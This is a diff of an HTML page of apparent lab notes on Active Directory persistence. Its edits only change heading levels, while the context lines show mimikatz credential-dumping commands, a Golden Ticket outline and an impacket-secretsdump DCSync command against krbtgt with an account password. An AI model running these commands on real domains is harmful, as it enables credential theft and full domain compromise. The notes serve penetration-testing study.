@@ -173,12 +173,11 @@
 
                 <div id="content" class="content">
                     <main>
-                        <h1 id="persistence"><a class="header" href="#persistence">Persistence</a></h1>
+                        <h2 id="persistence"><a class="header" href="#persistence">Persistence</a></h2>
 <p>With krbtgt, We can create a Golden ticket.</p>
 <h3 id="links"><a class="header" href="#links">Links</a></h3>
 <ul>
 <li><a href="https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump">LSA Dump</a></li>
-<li></li>
 </ul>
 <h3 id="golden-ticket-attack"><a class="header" href="#golden-ticket-attack">Golden Ticket Attack</a></h3>
 <pre><code># Assuming that Victim account is member of Domain Admin or we have compromised the DC.
@@ -215,7 +214,7 @@ impacket-secretsdump -just-dc-user krbtgt corp.com/jeffadmin:"BrouhahaTungPerora
 </code></pre>
 <p>We can request a replication update with a DC and obtain the pass hashes of every account in Active Directory without ever logging in to the domain controller.</p>
 <h3 id="other-notes"><a class="header" href="#other-notes">Other Notes</a></h3>
-<h2 id="silver-tickets"><a class="header" href="#silver-tickets">Silver Tickets</a></h2>
+<h3 id="silver-tickets"><a class="header" href="#silver-tickets">Silver Tickets</a></h3>
 <pre><code>iwr -UseDefaultCredentials http://web04
 privilege::debug
 sekurlsa::logonpasswords
